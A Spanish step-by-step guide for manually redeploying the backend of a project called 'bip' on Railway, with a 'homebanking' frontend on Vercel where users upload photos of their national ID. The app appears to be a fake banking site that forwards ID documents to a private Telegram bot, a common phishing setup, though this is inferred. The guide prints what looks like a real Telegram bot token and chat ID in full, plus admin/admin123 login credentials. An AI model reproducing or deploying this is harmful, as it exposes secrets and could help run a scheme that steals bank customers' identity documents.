# 🚂 Deploy Manual a Railway - PASO A PASO

## ❌ Problema Actual
El git push falla, pero Railway necesita los cambios para corregir el error de DNI.

## ✅ Solución: Deploy desde Railway Dashboard

### Paso 1: Ve a Railway
🌐 Abre: https://railway.app/dashboard

### Paso 2: Selecciona tu Proyecto
- Click en el proyecto "bip" o "bip-production"
- Verás el servicio del backend

### Paso 3: Settings del Backend
- Click en el servicio del backend
- Ve a la pestaña "Settings"
- Scroll hasta encontrar "Service"

### Paso 4: Variables de Entorno (IMPORTANTE)
Verifica que estén configuradas:
```
TELEGRAM_BOT_TOKEN=8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
TELEGRAM_CHAT_ID=8523843948
NODE_ENV=production
PORT=3000
```

### Paso 5: Redeploy Manual

**Opción A: Trigger Deploy**
1. Ve a "Deployments"
2. Click en los 3 puntos (...) del último deploy
3. Click "Redeploy"

**Opción B: Desde Settings**
1. En "Settings"
2. Busca "Redeploy"
3. Click en el botón

### Paso 6: Espera (2-3 minutos)
- Verás el log de build en tiempo real
- Espera a ver "✅ Build Success"
- Luego verás "🚀 Deployment Live"

### Paso 7: Prueba
Después de 3 minutos:
1. Abre https://homebanking-frontend.vercel.app
2. Login: `admin` / `admin123`
3. Sube fotos del DNI
4. ¡Debería funcionar! ✅

---

## 🔧 Alternativa: Subir código manualmente a GitHub

Si sigues teniendo problemas, puedes:

1. **Eliminar el repositorio Git local:**
```bash
cd c:\Users\CHRISTIAN\Desktop\bip
Remove-Item -Recurse -Force .git
```

2. **Crear nuevo repo:**
```bash
git init
git add .
git commit -m "Fix DNI error"
```

3. **Crear nuevo repo en GitHub:**
   - Ve a https://github.com/new
   - Crea un repo llamado "bip-homebanking"
   - Copia el comando de push

4. **Push al nuevo repo:**
```bash
git remote add origin https://github.com/TU-USUARIO/bip-homebanking.git
git branch -M main
git push -u origin main
```

5. **Conectar Railway al nuevo repo:**
   - En Railway Dashboard
   - Settings → Connect GitHub
   - Selecciona el nuevo repo

---

## 📋 Checklist

- [ ] Entré a Railway Dashboard
- [ ] Encontré el proyecto "bip"
- [ ] Verifiqué las variables de entorno
- [ ] Hice "Redeploy"
- [ ] Esperé 3 minutos
- [ ] Probé en https://homebanking-frontend.vercel.app
- [ ] ✅ Funciona sin errores

---

## 🆘 Si aún falla

Revisa los logs en Railway:
1. Click en tu servicio
2. Ve a "Logs"
3. Busca líneas que digan "ERROR" o "❌"
4. Copia los errores y avísame
